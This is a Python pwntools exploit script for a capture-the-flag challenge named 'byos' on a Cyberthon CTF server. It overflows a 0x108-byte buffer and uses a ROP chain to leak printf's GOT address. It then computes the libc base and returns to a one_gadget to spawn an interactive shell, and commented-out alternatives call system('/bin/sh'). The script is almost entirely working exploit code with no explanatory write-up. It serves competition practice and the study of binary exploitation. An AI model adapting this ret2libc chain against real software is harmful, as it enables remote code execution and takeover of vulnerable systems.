from pwn import *

context.binary = elf = context.binary = ELF('byos')
libc = ELF('libc.so.6')

io = remote('chals.cyberthon22t.ctf.sg', 20201)
to_fill = 0x100 + 8

# Manual way
printf_got = elf.got['printf']
puts_plt = elf.plt['puts']
main = elf.symbols['main']
POP_RDI = 0x4007e3
payload = b'A' * to_fill + p64(POP_RDI) + p64(printf_got) + p64(puts_plt) + p64(main)  # Manual way: calls puts(printf_got) to leak address of printf in the GOT then return to main to allow input again

# Automatic way
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.main()
payload = b'A' * to_fill + rop.chain()  # Automatic way using rop chain, both works


io.recvuntil(b'Enter Input =>')
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
print('leak:', hex(leak))

libc_printf_offset = libc.symbols['printf']
# libc_system_offset = libc.symbols['system']
# BIN_SH_offset_searched = next(libc.search(b"/bin/sh"))
ONE_GADGET = 0x10a2fc  # found using one_gadget libc.so.6
# print(hex(BIN_SH_offset_searched))

libc_base = leak - libc_printf_offset
# libc_system = libc_base + libc_system_offset
# libc_BIN_SH = libc_base + BIN_SH_offset_searched
libc_one_gadget = libc_base + ONE_GADGET
# print('system:', hex(libc_system))
# print('binsh:', hex(libc_BIN_SH))

# payload = b'A' * to_fill + p64(POP_RDI) + p64(libc_BIN_SH) + p64(ret) + p64(libc_system)  # dont work due to space in payload
payload = b'A' * to_fill + p64(libc_one_gadget)  # return directly to libc onegadget
io.recvuntil(b'Enter Input =>')
io.sendline(payload)
io.interactive()

# alternative way but doesnt work for this (same reason as manual way)
# from pwn import *
#
# p = remote('chals.cyberthon22t.ctf.sg', 20201)
# libc = ELF('libc.so.6')
#
# context.binary = elf = ELF('byos')
#
# rop = ROP(elf)
# rop.puts(elf.sym.printf)
# rop.main()
#
# p.sendline(flat({0x100 + 8: rop.chain()}))
# p.recvuntil(b'Enter Input =>')
# leak = u64(p.recvline().strip().ljust(8, b'\x00'))
#
# log.info(f"leak: {hex(leak)}")
#
# libc.address = leak - libc.sym.printf
# binsh = next(libc.search(b"/bin/sh"))
#
# rop = ROP([libc, elf])
# rop.system(binsh)
#
# p.sendline(flat({0x100 + 8: rop.chain()}))
# p.interactive()
